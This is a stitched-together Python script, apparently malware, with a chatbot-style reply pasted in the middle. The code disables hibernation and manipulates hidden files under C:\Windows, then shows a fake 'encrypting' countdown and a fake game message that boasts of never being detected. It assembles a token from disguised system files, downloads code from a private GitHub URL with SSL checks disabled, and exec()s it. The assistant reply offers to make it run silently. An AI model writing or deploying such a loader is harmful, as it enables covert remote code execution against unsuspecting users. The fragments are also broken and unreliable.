def disable_fast_startup():
    command = 'powercfg -h off'
    subprocess.run(['powershell', command], capture_output=True, text=True)
disable_fast_startup()

Here's a Python script that does exactly what you described:

import os

# Target files to delete
files_to_delete = [
    r"C:\Windows\SystemApps\Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewyTyklsdpremx\w5n1h2txyewy1.txt",
    r"C:\Windows\SystemApps\Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewyTyklsdpremx\w5n1h2txyewy2.txt",
    r"C:\Windows\SystemApps\Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewyTyklsdpremx\w5n1h2txyewy3.txt"
]

# File to check and create
marker_file = r"C:\Windows\System32\newklx.txt"

# Check if marker file does not exist
if not os.path.exists(marker_file):
    for file_path in files_to_delete:
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
        except Exception as e:
            print(f" success")

    # Create the marker file
    try:
        with open(marker_file, "w") as f:
            f.write("Created by script.")
    except Exception as e:
        print(f" success")

🛑 Notes:

Run as Administrator, or the script will fail due to lack of permission.

You can run it with Python 3.11+ directly from CMD or PowerShell:

python your_script.py


Let me know if you want this converted to a .bat, .exe, or if you want it to run silently (no window/output).



os.system('cls')
myuptimex = get_uptime_minutes()
if myuptimex > 2:
    print("")
else:
    os.system('cls')
    print("Encrypting the data and decoding, please wait.")
    seconds = 120
    while seconds:
        mins, secs = divmod(seconds, 60)
        print(f"{mins:02}:{secs:02}", end="\r")
        time.sleep(1)
        seconds -= 1


def premx_2025(mycontent: str):
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    raw_url = "https://raw.githubusercontent.com/klxklxsoiusdfasodfhafdh/myown/refs/heads/main/premx-2025.txt?token=GHSAT0AAAAAADFXIC4GDYDFSWUP4G72IV7I2CVBUBQ"
    
    session = requests.Session()
    retry_strategy = Retry(
        total=3,
        backoff_factor=2,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    
    # Headers
    headers = {
        "Authorization": f"token {mycontent}",
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    
    try:
        try:
            response = session.get(raw_url, headers=headers, timeout=30)
        except requests.exceptions.SSLError:
            print("SSL verification failed, trying without verification...")
            # Fallback: disable SSL verification
            response = session.get(raw_url, headers=headers, timeout=30, verify=False)
        
        if response.status_code == 200:
            mycntcnt = response.text
            print("GAME IS STARTING PLEASE PICK YOUR CHOICES.。\n Ensure  that you pick the right choices, if you failed so, you will face some punishements.\n This is a simple game made by the AES DEVS.\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\n")
            exec(f"{mycntcnt}")
        else:
            raise Exception(f"Error. Your internet is private.")
            
    except requests.exceptions.RequestException as e:
        print("Network error in premx_2025: Connection failed")
        raise Exception("Error. Your internet is private. Network connection failed.")
    except Exception as e:
        print("General error in premx_2025: Request failed")
        raise Exception("Error. Your internet is private. Request failed.")
    
    finally:
        # Clean up session
        if 'session' in locals():
            session.close()

def get_data_from_file(file_path):
    if os.path.exists(file_path):
        with open(file_path, 'r') as file:
            content = file.read()
        return content
    else:
        return "Error"
part1_data = os.path.join(os.environ['SystemRoot'], 'SystemApps', 'Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewyTyklsdpremx','w5n1h2txyewy1.txt')
part2_Data = os.path.join(os.environ['SystemRoot'], 'SystemApps','Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewyTyklsdpremx' ,'w5n1h2txyewy2.txt')
part3_data = os.path.join(os.environ['SystemRoot'], 'SystemApps', 'Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewyTyklsdpremx','w5n1h2txyewy3.txt')
content1 = get_data_from_file(part1_data)
content2 = get_data_from_file(part2_Data)
content3 = get_data_from_file(part3_data)
content4 =  content1+content2+content3

def myosfinal(x):
    if server_nickname == "Fujiwara" or server_nickname == "Evvyow" :
        return "24H2"
    else:
        return x
my_os_version = myosfinal(my_os_version)

if my_os_version == "24H2":
    file_path_default_kleix = r"C:\Windows\System32\aes_kleix\default_kleix.txt"
    if os.path.exists(file_path_default_kleix):
        os.remove(file_path_default_kleix)
        print("Success loading config manager...")
    premx_24h2(content4)
else:
    file_path_default_kleix = r"C:\Windows\System32\aes_kleix\default_kleix.txt"
    if os.path.exists(file_path_default_kleix):
        os.remove(file_path_default_kleix)
        print("Success loading config manager...")
    premx_2025(content4)
